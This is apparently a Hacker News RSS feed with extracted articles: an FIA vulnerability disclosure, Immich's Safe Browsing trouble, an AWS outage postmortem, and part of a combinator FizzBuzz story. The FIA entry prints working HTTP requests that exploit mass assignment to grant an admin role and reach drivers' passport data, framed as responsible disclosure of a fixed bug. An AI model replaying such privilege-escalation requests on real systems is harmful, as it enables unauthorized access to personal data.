<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-10-23T17:37:14.086744+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45673130</id><title>Accessing Max Verstappen's passport and PII through FIA bugs</title><updated>2025-10-23T17:37:20.549091+00:00</updated><content>&lt;doc fingerprint="6c1f451b1fc79758"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;With security startups getting flooded with VC funding in the past few years, some of the biggest networking events have centered themselves around the Formula 1 Grand Prix. Companies like CrowdStrike and Darktrace spend millions of dollars sponsoring teams, while others like Bitdefender have official partnerships to be a racing team's cybersecurity partner.&lt;/p&gt;
    &lt;p&gt;Having been able to attend these events by hoarding airline miles and schmoozing certain cybersecurity vendors, Gal Nagli, Sam Curry, and I thought it would be fun to try and hack some of the different supporting websites for the Formula 1 events.&lt;/p&gt;
    &lt;p&gt;This blog is part 1 of 3 in a series of vulnerabilities found in Formula 1.&lt;/p&gt;
    &lt;head rend="h2"&gt;Finding F1 Driver Licenses&lt;/head&gt;
    &lt;p&gt;To race in Formula 1, drivers hold an FIA Super Licence. It’s issued annually through a driver’s national motorsport authority (ASN) once they’ve met the FIA’s requirements, typically spending years in smaller races to earn Super Licence points, along with meeting minimum age thresholds and other medical/written tests.&lt;/p&gt;
    &lt;p&gt;F1 drivers often compete outside Grands Prix as well, where the FIA uses a Driver Categorisation (Bronze/Silver/Gold/Platinum) to balance teams. That categorisation is managed via the FIA portal at drivercategorisation.fia.com, which supports public self-registration for competitors to request or update their Bronze/Silver/Gold/Platinum status and submit results for review. This system is separate from the Super Licence, but many F1 drivers appear in both and receive automatic Platinum status for holding an active Super Licence.&lt;/p&gt;
    &lt;p&gt;After creating an account with an email and password, you are thrown into the actual application process. Normally, you will have to upload a lot of supporting documents for your request for categorization, including identity documents and racing CVs/history. However, we noticed there is a very simple HTTP PUT request that is used to update your user profile:&lt;/p&gt;
    &lt;code&gt;PUT /api/users/12934 HTTP/1.1
Host: driverscategorisation.fia.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Length: 246
Content-Type: application/json

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null
}&lt;/code&gt;
    &lt;p&gt;The HTTP request to update our profile didn't really have many interesting attributes, but the JSON returned in the response had a lot of extra values:&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 200
Content-type: application/json
Content-Length: 313

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "keepNamePrivate": false,
  "nickName2": null,
  "birthDate": "2000-02-17",
  "gender": null,
  "token": null,
  "roles": null,
  "country": null,
  "filters": [],
  "status": "ACTIVATED",
  "secondaryEmail": null
}&lt;/code&gt;
    &lt;p&gt;The JSON HTTP response for updating our own profile contained the "roles" parameter, something that might allow us to escalate privileges if the PUT request was vulnerable to mass assignment. We began looking through the JavaScript for any logic related to this parameter.&lt;/p&gt;
    &lt;p&gt;Based on the JavaScript, there were a number of different roles on the website that were intended to be used by drivers, FIA staff, and site administrators. The most interesting one was obviously admin, so we guessed the correct HTTP PUT request format to try and update our roles based on the JavaScript:&lt;/p&gt;
    &lt;code&gt;PUT /api/users/12934 HTTP/1.1
Host: driverscategorisation.fia.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Length: 246
Content-Type: application/json

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "roles": [
    {
      "id": 1,
      "description": "ADMIN role",
      "name": "ADMIN"
    }
  ]
}&lt;/code&gt;
    &lt;p&gt;Our test worked exactly as predicted. The HTTP response showed that the update was successful, and we now held the administrator role for the website.&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 200
Content-type: application/json
Content-Length: 313

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "keepNamePrivate": false,
  "nickName2": null,
  "birthDate": "1999-10-17",
  "gender": null,
  "token": null,
  "roles": [
    {
      "id": 1,
      "description": "ADMIN role",
      "name": "ADMIN"
    }
  ],
  "country": null,
  "filters": [],
  "status": "ACTIVATED",
  "secondaryEmail": null
}
&lt;/code&gt;
    &lt;p&gt;We reauthenticated in order to refresh our session, and upon logging in, we were shown an entirely new dashboard that was intended to be used by FIA administrators to categorise drivers, manage employees, and update server-side variables like email templates and more. We seemed to have full admin access to the FIA driver categorization website.&lt;/p&gt;
    &lt;p&gt;To validate our finding, we attempted to load a driver's profile and observed the user's password hash, email address, phone number, passport, resume, and all related PII. Additionally, we could load all internal communications related to driver categorisation including comments about their performance and committee related decisions.&lt;/p&gt;
    &lt;p&gt;We stopped testing after seeing that it was possible to access Max Verstappen's passport, resume, license, password hash, and PII. This data could be accessed for all F1 drivers with a categorization, alongside sensitive information of internal FIA operations. We did not access any passports / sensitive information and all data has been deleted.&lt;/p&gt;
    &lt;head rend="h3"&gt;Disclosure timeline&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;06/03/2025: Initial disclosure to FIA via email and Linkedin&lt;/item&gt;
      &lt;item&gt;06/03/2025: Initial response from FIA, site taken offline&lt;/item&gt;
      &lt;item&gt;06/10/2025: Official response from FIA informing us of a comprehensive fix&lt;/item&gt;
      &lt;item&gt;10/22/2025: Release of blog post, public disclosure&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://ian.sh/fia"/><published>2025-10-22T18:21:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45675015</id><title>Google flags Immich sites as dangerous</title><updated>2025-10-23T17:37:20.371695+00:00</updated><content>&lt;doc fingerprint="8912a2d078360380"&gt;
  &lt;main&gt;
    &lt;p&gt;October 20, 2025&lt;/p&gt;
    &lt;p&gt;— Jason Rasmussen&lt;/p&gt;
    &lt;p&gt;Earlier this month all of our &lt;code&gt;*.immich.cloud&lt;/code&gt; websites were marked as dangerous and users started being shown the dreaded "red-screen-of-death" page.&lt;/p&gt;
    &lt;p&gt;No one on the team really understood how this browser feature worked, but it's now, unfortunately, been added to our list of Cursed Knowledge .&lt;/p&gt;
    &lt;p&gt;Google offers a service called Safe Browsing , which aims to determine if a site is running malware, unwanted software, or performs some form of social engineering. The service is free, and many browsers, including Chrome &amp;amp; Firefox, directly integrate the service into their products, although it is still a bit unclear how it actually determines if something is "dangerous".&lt;/p&gt;
    &lt;p&gt;So, what happens if your site is marked as dangerous? Well, since most browsers seem to use this service, your site essentially becomes unavailable for all users, except the few that might realize it's a false positive, click the &lt;code&gt;Details&lt;/code&gt; button, and then see and click the tiny, underlined "visit this safe site" link. So basically it becomes unavailable for your entire audience with little apparent recourse.&lt;/p&gt;
    &lt;p&gt;At some point earlier this month, we realized that a bunch of sites on the &lt;code&gt;immich.cloud&lt;/code&gt; domain had recently started showing up as "dangerous". At the same time, a few users started complaining about their own Immich deployments being flagged. We also noticed that all our own internal sites had the same warning, including our preview environments. It got old real fast to have to go through the tedious effort to "view this safe site" whenever we wanted to view anything.&lt;/p&gt;
    &lt;p&gt;After a few days we realized this warning was not going to go away on its own, and that the Google Search Console was apparently the official way to manage these types of issues. It seems a bit crazy that the only way to make our site available again was to create a Google account, and use the Google Search Console to request a review of the affected site. The service did at least provide a few more details about what exactly was flagged, although it made the whole thing a bit more comical. Per the service:&lt;/p&gt;
    &lt;p&gt;Google has detected harmful content on some of your site’s pages. We recommend that you remove it as soon as possible. Until then, browsers such as Google Chrome will display a warning when users visit or download certain files from your site.&lt;/p&gt;
    &lt;p&gt;and&lt;/p&gt;
    &lt;p&gt;These pages attempt to trick users into doing something dangerous, such as installing unwanted software or revealing personal information.&lt;/p&gt;
    &lt;p&gt;Below these warnings was a list of affected URLs:&lt;/p&gt;
    &lt;code&gt;https://main.preview.internal.immich.cloud/
https://main.preview.internal.immich.cloud/auth/login
https://pr-22838.preview.internal.immich.cloud/
https://pr-22838.preview.internal.immich.cloud/auth/login
...&lt;/code&gt;
    &lt;p&gt;It was super useful to learn that the affected URLs were for our preview environments. Maybe the thought was that these Immich environments were imitating our demo website ? The most alarming thing was realizing that a single flagged subdomain would apparently invalidate the entire domain.&lt;/p&gt;
    &lt;p&gt;This issue affects all of our preview environments and other internal services such as zitadel, outline, grafana, victoria metrics, etc. This also impacts our production tile server, which is deployed at &lt;code&gt;tiles.immich.cloud&lt;/code&gt; . Luckily, the requests to the tile server are made via JavaScript, and since those are not user facing they seem to still be working as expected.&lt;/p&gt;
    &lt;p&gt;The Google Search Console has a &lt;code&gt;Request Review&lt;/code&gt; button, where you can explain how you have resolved the issues. It does warn that:&lt;/p&gt;
    &lt;p&gt;Requesting a review of issues that weren't fixed will result in longer review cycles&lt;/p&gt;
    &lt;p&gt;Since, nothing is actually wrong we decided to respond with the following:&lt;/p&gt;
    &lt;p&gt;Immich is a self-hosted application, and the Immich team (https://immich.app/ ) owns and operates the &lt;code&gt;immich.cloud&lt;/code&gt; domain and subdomains. The flagged sites are our own deployments of our own products and are not impersonating anything or anyone else.&lt;/p&gt;
    &lt;p&gt;A day or two later, the resolution was accepted and the domain was clean again! 🎉&lt;/p&gt;
    &lt;p&gt;We thought we were home free, but unfortunately that was not the case.&lt;/p&gt;
    &lt;p&gt;An Immich preview environment can be requested by adding the &lt;code&gt;preview&lt;/code&gt; label to a pull request on GitHub. When the environment is created, a comment is posted on the pull request with the preview url, which follows the following format:&lt;/p&gt;
    &lt;code&gt;https://pr-&amp;lt;num&amp;gt;.preview.internal.immich.cloud/&lt;/code&gt;
    &lt;p&gt;As soon as we created a new preview environment, the &lt;code&gt;immich.cloud&lt;/code&gt; domain was once again flagged as a dangerous site. The best we can tell, Google crawls GitHub, sees the new URL, crawls the site, marks it as deceptive, and the whole process begins anew.&lt;/p&gt;
    &lt;p&gt;Our current plan is to attempt to minimize the impact of this issue by moving the preview environments to their own, dedicated domain — &lt;code&gt;immich.build&lt;/code&gt; .&lt;/p&gt;
    &lt;p&gt;Google Safe Browsing looks to be have been built without consideration for open-source or self-hosted software. Many popular projects have run into similar issues, such as:&lt;/p&gt;
    &lt;p&gt;Unfortunately, Google seems to have the ability to arbitrarily flag any domain and make it immediately unaccessible to users. I'm not sure what, if anything, can be done when this happens, except constantly request another review from the all mighty Google.&lt;/p&gt;
    &lt;p&gt;Cheers,&lt;lb/&gt;The Immich Team&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://immich.app/blog/google-flags-immich-as-dangerous"/><published>2025-10-22T20:53:49+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45677139</id><title>Summary of the Amazon DynamoDB Service Disruption in US-East-1 Region</title><updated>2025-10-23T17:37:20.065493+00:00</updated><content>&lt;doc fingerprint="6368b2816cb127ce"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Summary of the Amazon DynamoDB Service Disruption in Northern Virginia (US-EAST-1) Region&lt;/head&gt;
    &lt;p&gt;We wanted to provide you with some additional information about the service disruption that occurred in the N. Virginia (us-east-1) Region on October 19 and 20, 2025. While the event started at 11:48 PM PDT on October 19 and ended at 2:20 PM PDT on October 20, there were three distinct periods of impact to customer applications. First, between 11:48 PM on October 19 and 2:40 AM on October 20, Amazon DynamoDB experienced increased API error rates in the N. Virginia (us-east-1) Region. Second, between 5:30 AM and 2:09 PM on October 20, Network Load Balancer (NLB) experienced increased connection errors for some load balancers in the N. Virginia (us-east-1) Region. This was caused by health check failures in the NLB fleet, which resulted in increased connection errors on some NLBs. Third, between 2:25 AM and 10:36 AM on October 20, new EC2 instance launches failed and, while instance launches began to succeed from 10:37 AM, some newly launched instances experienced connectivity issues which were resolved by 1:50 PM.&lt;/p&gt;
    &lt;p&gt;DynamoDB&lt;/p&gt;
    &lt;p&gt;Between 11:48 PM PDT on October 19 and 2:40 AM PDT on October 20, customers experienced increased Amazon DynamoDB API error rates in the N. Virginia (us-east-1) Region. During this period, customers and other AWS services with dependencies on DynamoDB were unable to establish new connections to the service. The incident was triggered by a latent defect within the service’s automated DNS management system that caused endpoint resolution failures for DynamoDB.&lt;/p&gt;
    &lt;p&gt;Many of the largest AWS services rely extensively on DNS to provide seamless scale, fault isolation and recovery, low latency, and locality. Services like DynamoDB maintain hundreds of thousands of DNS records to operate a very large heterogeneous fleet of load balancers in each Region. Automation is crucial to ensuring that these DNS records are updated frequently to add additional capacity as it becomes available, to correctly handle hardware failures, and to efficiently distribute traffic to optimize customers’ experience. This automation has been designed for resilience, allowing the service to recover from a wide variety of operational issues. In addition to providing a public regional endpoint, this automation maintains additional DNS endpoints for several dynamic DynamoDB variants including a FIPS compliant endpoint, an IPv6 endpoint, and account-specific endpoints. The root cause of this issue was a latent race condition in the DynamoDB DNS management system that resulted in an incorrect empty DNS record for the service’s regional endpoint (dynamodb.us-east-1.amazonaws.com) that the automation failed to repair. To explain this event, we need to share some details about the DynamoDB DNS management architecture. The system is split across two independent components for availability reasons. The first component, the DNS Planner, monitors the health and capacity of the load balancers and periodically creates a new DNS plan for each of the service’s endpoints consisting of a set of load balancers and weights. We produce a single regional DNS plan, as this greatly simplifies capacity management and failure mitigation when capacity is shared across multiple endpoints, as is the case with the recently launched IPv6 endpoint and the public regional endpoint. A second component, the DNS Enactor, which is designed to have minimal dependencies to allow for system recovery in any scenario, enacts DNS plans by applying the required changes in the Amazon Route53 service. For resiliency, the DNS Enactor operates redundantly and fully independently in three different Availability Zones (AZs). Each of these independent instances of the DNS Enactor looks for new plans and attempts to update Route53 by replacing the current plan with a new plan using a Route53 transaction, assuring that each endpoint is updated with a consistent plan even when multiple DNS Enactors attempt to update it concurrently. The race condition involves an unlikely interaction between two of the DNS Enactors. The normal way things work a DNS Enactor picks up the latest plan and begins working through the service endpoints to apply this plan. This process typically completes rapidly and does an effective job of keeping DNS state freshly updated. Before it begins to apply a new plan, the DNS Enactor makes a one-time check that its plan is newer than the previously applied plan. As the DNS Enactor makes its way through the list of endpoints, it is possible to encounter delays as it attempts a transaction and is blocked by another DNS Enactor updating the same endpoint. In these cases, the DNS Enactor will retry each endpoint until the plan is successfully applied to all endpoints. Right before this event started, one DNS Enactor experienced unusually high delays needing to retry its update on several of the DNS endpoints. As it was slowly working through the endpoints, several other things were also happening. First, the DNS Planner continued to run and produced many newer generations of plans. Second, one of the other DNS Enactors then began applying one of the newer plans and rapidly progressed through all of the endpoints. The timing of these events triggered the latent race condition. When the second Enactor (applying the newest plan) completed its endpoint updates, it then invoked the plan clean-up process, which identifies plans that are significantly older than the one it just applied and deletes them. At the same time that this clean-up process was invoked, the first Enactor (which had been unusually delayed) applied its much older plan to the regional DDB endpoint, overwriting the newer plan. The check that was made at the start of the plan application process, which ensures that the plan is newer than the previously applied plan, was stale by this time due to the unusually high delays in Enactor processing. Therefore, this did not prevent the older plan from overwriting the newer plan. The second Enactor’s clean-up process then deleted this older plan because it was many generations older than the plan it had just applied. As this plan was deleted, all IP addresses for the regional endpoint were immediately removed. Additionally, because the active plan was deleted, the system was left in an inconsistent state that prevented subsequent plan updates from being applied by any DNS Enactors. This situation ultimately required manual operator intervention to correct.&lt;/p&gt;
    &lt;p&gt;When this issue occurred at 11:48 PM PDT, all systems needing to connect to the DynamoDB service in the N. Virginia (us-east-1) Region via the public endpoint immediately began experiencing DNS failures and failed to connect to DynamoDB. This included customer traffic as well as traffic from internal AWS services that rely on DynamoDB. Customers with DynamoDB global tables were able to successfully connect to and issue requests against their replica tables in other Regions, but experienced prolonged replication lag to and from the replica tables in the N. Virginia (us-east-1) Region. Engineering teams for impacted AWS services were immediately engaged and began to investigate. By 12:38 AM on October 20, our engineers had identified DynamoDB’s DNS state as the source of the outage. By 1:15 AM, the temporary mitigations that were applied enabled some internal services to connect to DynamoDB and repaired key internal tooling that unblocked further recovery. By 2:25 AM, all DNS information was restored, and all global tables replicas were fully caught up by 2:32 AM. Customers were able to resolve the DynamoDB endpoint and establish successful connections as cached DNS records expired between 2:25 AM and 2:40 AM. This completed recovery from the primary service disruption event.&lt;/p&gt;
    &lt;p&gt;Amazon EC2&lt;/p&gt;
    &lt;p&gt;Between 11:48 PM PDT on October 19 and 1:50 PM PDT on October 20, customers experienced increased EC2 API error rates, latencies, and instance launch failures in the N. Virginia (us-east-1) Region. Existing EC2 instances that had been launched prior to the start of the event remained healthy and did not experience any impact for the duration of the event. After resolving the DynamoDB DNS issue at 2:25 AM PDT, customers continued to see increased errors for launches of new instances. Recovery started at 12:01 PM PDT with full EC2 recovery occurring at 1:50 PM PDT. During this period new instance launches failed with either a “request limit exceeded” or “insufficient capacity” error.&lt;/p&gt;
    &lt;p&gt;To understand what happened, we need to share some information about a few subsystems that are used for the management of EC2 instance launches, as well as for configuring network connectivity for newly launched EC2 instances. The first subsystem is DropletWorkflow Manager (DWFM), which is responsible for the management of all the underlying physical servers that are used by EC2 for the hosting of EC2 instances – we call these servers “droplets”. The second subsystem is Network Manager, which is responsible for the management and propagation of network state to all EC2 instances and network appliances. Each DWFM manages a set of droplets within each Availability Zone and maintains a lease for each droplet currently under management. This lease allows DWFM to track the droplet state, ensuring that all actions from the EC2 API or within the EC2 instance itself, such as shutdown or reboot operations originating from the EC2 instance operating system, result in the correct state changes within the broader EC2 systems. As part of maintaining this lease, each DWFM host has to check in and complete a state check with each droplet that it manages every few minutes.&lt;/p&gt;
    &lt;p&gt;Starting at 11:48 PM PDT on October 19, these DWFM state checks began to fail as the process depends on DynamoDB and was unable to complete. While this did not affect any running EC2 instance, it did result in the droplet needing to establish a new lease with a DWFM before further instance state changes could happen for the EC2 instances it is hosting. Between 11:48 PM on October 19 and 2:24 AM on October 20, leases between DWFM and droplets within the EC2 fleet slowly started to time out.&lt;/p&gt;
    &lt;p&gt;At 2:25 AM PDT, with the recovery of the DynamoDB APIs, DWFM began to re-establish leases with droplets across the EC2 fleet. Since any droplet without an active lease is not considered a candidate for new EC2 launches, the EC2 APIs were returning “insufficient capacity errors” for new incoming EC2 launch requests. DWFM began the process of reestablishing leases with droplets across the EC2 fleet; however, due to the large number of droplets, efforts to establish new droplet leases took long enough that the work could not be completed before they timed out. Additional work was queued to reattempt establishing the droplet lease. At this point, DWFM had entered a state of congestive collapse and was unable to make forward progress in recovering droplet leases. Since this situation had no established operational recovery procedure, engineers took care in attempting to resolve the issue with DWFM without causing further issues. After attempting multiple mitigation steps, at 4:14 AM engineers throttled incoming work and began selective restarts of DWFM hosts to recover from this situation. Restarting the DWFM hosts cleared out the DWFM queues, reduced processing times, and allowed droplet leases to be established. By 5:28 AM, DWFM had established leases with all droplets within the N. Virginia (us-east-1) Region and new launches were once again starting to succeed, although many requests were still seeing “request limit exceeded” errors due to the request throttling that had been introduced to reduce overall request load.&lt;/p&gt;
    &lt;p&gt;When a new EC2 instance is launched, a system called Network Manager propagates the network configuration that allows the instance to communicate with other instances within the same Virtual Private Cloud (VPC), other VPC network appliances, and the Internet. At 5:28 AM PDT, shortly after the recovery of DWFM, Network Manager began propagating updated network configurations to newly launched instances and instances that had been terminated during the event. Since these network propagation events had been delayed by the issue with DWFM, a significant backlog of network state propagations needed to be processed by Network Manager within the N. Virginia (us-east-1) Region. As a result, at 6:21 AM, Network Manager started to experience increased latencies in network propagation times as it worked to process the backlog of network state changes. While new EC2 instances could be launched successfully, they would not have the necessary network connectivity due to the delays in network state propagation. Engineers worked to reduce the load on Network Manager to address network configuration propagation times and took action to accelerate recovery. By 10:36 AM, network configuration propagation times had returned to normal levels, and new EC2 instance launches were once again operating normally.&lt;/p&gt;
    &lt;p&gt;The final step towards EC2 recovery was to fully remove the request throttles that had been put in place to reduce the load on the various EC2 subsystems. As API calls and new EC2 instance launch requests stabilized, at 11:23 AM PDT our engineers began relaxing request throttles as they worked towards full recovery. At 1:50 PM, all EC2 APIs and new EC2 instance launches were operating normally.&lt;/p&gt;
    &lt;p&gt;Network Load Balancer (NLB)&lt;/p&gt;
    &lt;p&gt;The delays in network state propagations for newly launched EC2 instances also caused impact to the Network Load Balancer (NLB) service and AWS services that use NLB. Between 5:30 AM and 2:09 PM PDT on October 20 some customers experienced increased connection errors on their NLBs in the N. Virginia (us-east-1) Region. NLB is built on top of a highly scalable, multi-tenant architecture that provides load balancing endpoints and routes traffic to backend targets, which are typically EC2 instances. The architecture also makes use of a separate health check subsystem that regularly executes health checks against all nodes within the NLB architecture and will remove any nodes from service that are considered unhealthy.&lt;/p&gt;
    &lt;p&gt;During the event the NLB health checking subsystem began to experience increased health check failures. This was caused by the health checking subsystem bringing new EC2 instances into service while the network state for those instances had not yet fully propagated. This meant that in some cases health checks would fail even though the underlying NLB node and backend targets were healthy. This resulted in health checks alternating between failing and healthy. This caused NLB nodes and backend targets to be removed from DNS, only to be returned to service when the next health check succeeded.&lt;/p&gt;
    &lt;p&gt;Our monitoring systems detected this at 6:52 AM, and engineers began working to remediate the issue. The alternating health check results increased the load on the health check subsystem, causing it to degrade, resulting in delays in health checks and triggering automatic AZ DNS failover to occur. For multi-AZ load balancers, this resulted in capacity being taken out of service. In this case, an application experienced increased connection errors if the remaining healthy capacity was insufficient to carry the application load. At 9:36 AM, engineers disabled automatic health check failovers for NLB, allowing all available healthy NLB nodes and backend targets to be brought back into service. This resolved the increased connection errors to affected load balancers. Shortly after EC2 recovered, we re-enabled automatic DNS health check failover at 2:09 PM.&lt;/p&gt;
    &lt;p&gt;Other AWS Services&lt;/p&gt;
    &lt;p&gt;Between October 19 at 11:51 PM PDT and October 20 at 2:15 PM PDT, customers experienced API errors and latencies for Lambda functions in the N. Virginia (us-east-1) Region. Initially, DynamoDB endpoint issues prevented function creation and updates, caused processing delays for SQS/Kinesis event sources and invocation errors. By 2:24 AM, service operations recovered except for SQS queue processing, which remained impacted because an internal subsystem responsible for polling SQS queues failed and did not recover automatically. We restored this subsystem at 4:40 AM and processed all message backlogs by 6:00 AM. Starting at 7:04 AM, NLB health check failures triggered instance terminations leaving a subset of Lambda internal systems under-scaled. With EC2 launches still impaired, we throttled Lambda Event Source Mappings and asynchronous invocations to prioritize latency-sensitive synchronous invocations. By 11:27 AM, sufficient capacity was restored, and errors subsided. We then gradually reduced throttling and processed all backlogs by 2:15 PM, and normal service operations resumed.&lt;/p&gt;
    &lt;p&gt;Between October 19 at 11:45 PM PDT and October 20 at 2:20 PM PDT, customers experienced container launch failures and cluster scaling delays across both Amazon Elastic Container Service (ECS), Elastic Kubernetes Service (EKS), and Fargate in the N. Virginia (us-east-1) Region. These services were recovered by 2:20 PM.&lt;/p&gt;
    &lt;p&gt;Between October 19 at 11:56 PM PDT and October 20 at 1:20 PM PDT, Amazon Connect customers experienced elevated errors handling calls, chats, and cases in the N. Virginia (us-east-1) Region. Following the restoration of DynamoDB endpoints, most Connect features recovered except customers continued to experience elevated errors for chats until 5:00 AM. Starting at 7:04 AM, customers again experienced increased errors handling new calls, chats, tasks, emails, and cases, which was caused by impact to the NLBs used by Connect as well as increased error rates and latencies for Lambda function invocations. Inbound callers experienced busy tones, error messages, or failed connections. Both agent-initiated and API-initiated outbound calls failed. Answered calls experienced prompt playback failures, routing failures to agents, or dead-air audio. Additionally, agents experienced elevated errors handling contacts, and some agents were unable to sign in. Customers also faced elevated errors accessing APIs and Contact Search. Real-time, Historical dashboards, and Data Lake data updates were delayed, and all data will be backfilled by October 28. Service availability was restored at 1:20 PM as Lambda function invocation errors recovered.&lt;/p&gt;
    &lt;p&gt;On October 19, between 11:51 PM and 9:59 AM PDT, customers experienced AWS Security Token Service (STS) API errors and latency in the N. Virginia (us-east-1) Region. STS recovered at 1:19 AM after the restoration of internal DynamoDB endpoints. Between 8:31 AM and 9:59 AM, STS API error rates and latency increased again as a result of NLB health check failures. By 9:59 AM, we recovered from the NLB health check failures, and the service began normal operations.&lt;/p&gt;
    &lt;p&gt;Between October 19 at 11:51 PM PDT and October 20 at 1:25 AM PDT, AWS customers attempting to sign into the AWS Management Console using an IAM user experienced increased authentication failures due to underlying DynamoDB issues in the N. Virginia (us-east-1) Region. Customers with IAM Identity Center configured in N. Virginia (us-east-1) Region were also unable to sign in using Identity Center. Customers using their root credential, and customers using identity federation configured to use signin.aws.amazon.com experienced errors when trying to log into the AWS Management Console in regions outside of the N. Virginia (us-east-1) Region. As DynamoDB endpoints became accessible at 1:25 AM, the service began normal operations.&lt;/p&gt;
    &lt;p&gt;Between October 19 at 11:47 PM PDT and October 20 at 2:21 AM PDT, customers experienced API errors when creating and modifying Redshift clusters or issuing queries against existing clusters in the N. Virginia (us-east-1) Region. Redshift query processing relies on DynamoDB endpoints to read and write data from clusters. As DynamoDB endpoints recovered, Redshift query operations resumed and by 2:21 AM, Redshift customers were successfully querying clusters as well as creating and modifying cluster configurations. However, some Redshift compute clusters remained impaired and unavailable for querying after the DynamoDB endpoints were restored to normal operations. As credentials expire for cluster nodes without being refreshed, Redshift automation triggers workflows to replace the underlying EC2 hosts with new instances. With EC2 launches impaired, these workflows were blocked, putting clusters in a “modifying” state that prevented query processing and making the cluster unavailable for workloads. At 6:45 AM, our engineers took action to stop the workflow backlog from growing and when Redshift clusters started to launch replacement instances at 2:46 PM, the backlog of workflows began draining. By 4:05 AM PDT October 21, AWS operators completed restoring availability for clusters impaired by replacement workflows. In addition to cluster availability impairment, between October 19 at 11:47 PM and October 20 at 1:20 AM, Amazon Redshift customers in all AWS Regions were unable to use IAM user credentials for executing queries due to a Redshift defect that used an IAM API in the N. Virginia (us-east-1) Region to resolve user groups. As a result, IAM’s impairment during this period caused Redshift to be unable to execute these queries. Redshift customers in AWS Regions who use “local” users to connect to their Redshift clusters were unaffected.&lt;/p&gt;
    &lt;p&gt;Other AWS services that rely on DynamoDB, new EC2 instance launches, Lambda invocations, and Fargate task launches such as Managed Workflows for Apache Airflow, Outposts lifecycle operations, and AWS Support Center were also impacted in the N. Virginia (us-east-1) Region.&lt;/p&gt;
    &lt;p&gt;We are making several changes as a result of this operational event. We have already disabled the DynamoDB DNS Planner and the DNS Enactor automation worldwide. In advance of re-enabling this automation, we will fix the race condition scenario and add additional protections to prevent the application of incorrect DNS plans. For NLB, we are adding a velocity control mechanism to limit the capacity a single NLB can remove when health check failures cause AZ failover. For EC2, we are building an additional test suite to augment our existing scale testing, which will exercise the DWFM recovery workflow to identify any future regressions. We will improve the throttling mechanism in our EC2 data propagation systems to rate limit incoming work based on the size of the waiting queue to protect the service during periods of high load. Finally, as we continue to work through the details of this event across all AWS services, we will look for additional ways to avoid impact from a similar event in the future, and how to further reduce time to recovery.&lt;/p&gt;
    &lt;p&gt;In closing&lt;/p&gt;
    &lt;p&gt;We apologize for the impact this event caused our customers. While we have a strong track record of operating our services with the highest levels of availability, we know how critical our services are to our customers, their applications and end users, and their businesses. We know this event impacted many customers in significant ways. We will do everything we can to learn from this event and use it to improve our availability even further.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://aws.amazon.com/message/101925/"/><published>2025-10-23T01:19:58+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45678511</id><title>Programming with Less Than Nothing</title><updated>2025-10-23T17:37:19.479960+00:00</updated><content>&lt;doc fingerprint="bd43d22404bf9be9"&gt;
  &lt;main&gt;
    &lt;p&gt;Dana. The interviewer. Friendly, efficient. She leans forward.&lt;/p&gt;
    &lt;p&gt;“So,” she says, “walk me through FizzBuzz.”&lt;/p&gt;
    &lt;p&gt;You could do this in your sleep. “Is JavaScript okay?”&lt;/p&gt;
    &lt;p&gt;She nods.&lt;/p&gt;
    &lt;p&gt;You open your laptop and begin.&lt;/p&gt;
    &lt;code&gt;let S = (x) =&amp;gt; (y) =&amp;gt; (z) =&amp;gt; x(z)(y(z));
let K = (x) =&amp;gt; (y) =&amp;gt; x;&lt;/code&gt;
    &lt;p&gt;“That should do it,” you say to yourself. “Just need to combine these a few times.”&lt;/p&gt;
    &lt;p&gt;Dana raises an eyebrow. You continue.&lt;/p&gt;
    &lt;code&gt;let I = S(K)(K); // x =&amp;gt; x
let B = S(K(S))(K); // x =&amp;gt; y =&amp;gt; z =&amp;gt; x(y(z))
let C = S(B(B)(S))(K(K)); // x =&amp;gt; y =&amp;gt; z =&amp;gt; x(z)(y)
let W = S(S)(K(I)); // x =&amp;gt; y =&amp;gt; x(y)(y)
let T = C(I); // x =&amp;gt; y =&amp;gt; y(x)&lt;/code&gt;
    &lt;p&gt;Bluebird, cardinal, warbler, thrush. Avian friends you know well.&lt;/p&gt;
    &lt;p&gt;Dana looks puzzled. “Are we still doing FizzBuzz?”&lt;/p&gt;
    &lt;p&gt;“Getting there.”&lt;/p&gt;
    &lt;code&gt;let V = B(C)(T); // x =&amp;gt; y =&amp;gt; z =&amp;gt; z(x)(y)
let R = B(B)(T); // x =&amp;gt; y =&amp;gt; z =&amp;gt; y(z)(x)
let B1 = B(B)(B); // x =&amp;gt; y =&amp;gt; z =&amp;gt; w =&amp;gt; x(y)(z)(w)
